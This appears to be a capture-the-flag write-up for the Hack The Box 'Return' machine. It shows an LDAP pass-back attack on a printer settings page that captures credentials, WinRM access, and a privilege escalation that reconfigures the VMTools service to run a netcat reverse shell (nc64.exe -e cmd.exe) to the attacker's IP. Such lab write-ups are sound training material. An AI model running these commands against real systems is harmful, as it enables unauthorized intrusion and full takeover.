## Recon

I already tested for SMB Anonymous access but doesn't work so let's check out the webpage.

![Description](/static/images/htb/windows/return/1.jpg)

We are met with what looks like a printer page. It also has a settings page some useful information. It
reveals a valid `username` and what looks like a password

![Description](/static/images/htb/windows/return/2.jpg)

Inspecting it using dev tools does not reveal the password, its just prefilled with asterisks

![Description](/static/images/htb/windows/return/3.jpg)

Even if we try to update the settings it doesn't really update it, checking Burp, we can see an
unusual parameter

![Description](/static/images/htb/windows/return/4.jpg)

This got me thinking, what if we replace the address with our own address and open up a listener at
the specific port which it is listening which is `389` which is also the LDAP port.

```shell
POST /settings.php HTTP/1.1
Host: return.local
Content-Length: 14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://return.local
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36

```

This is called the [Pass-Back Attack](https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack)

![Description](/static/images/htb/windows/return/5.jpg)

And we received something that looks like a password, let us verify it along with WinRM access

![Description](/static/images/htb/windows/return/6.jpg)

## Gaining Access

annddd yes, we can definitely WinRM into `svc-printer` and can go ahead and grab the user flag

![Description](/static/images/htb/windows/return/7.jpg)

---

## Privilege Escalation

Runnning `whoami /priv` we can check for available privileges

![Description](/static/images/htb/windows/return/8.jpg)

We can see a lot of available privileges we can abuse such as SeBackupPrivilege, SeRestorePrivilege, SeLoadDriverPrivilege
but none of them will work. Why? because I already tried them and the only reason I could think of is Administrator is
probably not allowed to WinRM?

So I checked the Groups

![Description](/static/images/htb/windows/return/9.jpg)

`svc-printer` is a member of the `Server Operators` group which is not a vulnerability itself
but can be utilized by attackers to make changes in the domain that could escalate to system privileges

First we need to upload `netcat.exe` over to the target then list the available services

![Description](/static/images/htb/windows/return/10.jpg)

We will use the service "VMTools" and its binary path for this exploitation.

Replace the service binary with our uploaded netcat with a cmd reverse shell command

```
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc64.exe -e cmd.exe 10.10.14.32 1234"
```

Start a listener. Then, stop the service and then start it again

```
sc.exe stop VMTools
sc.exe start VMTools
```

Our listener should catch the shell

![Description](/static/images/htb/windows/return/11.jpg)

Great! Now that we are SYSTEM, we can easily grab the root flag

```
type C:\Users\Administrator\Desktop\root.txt
```
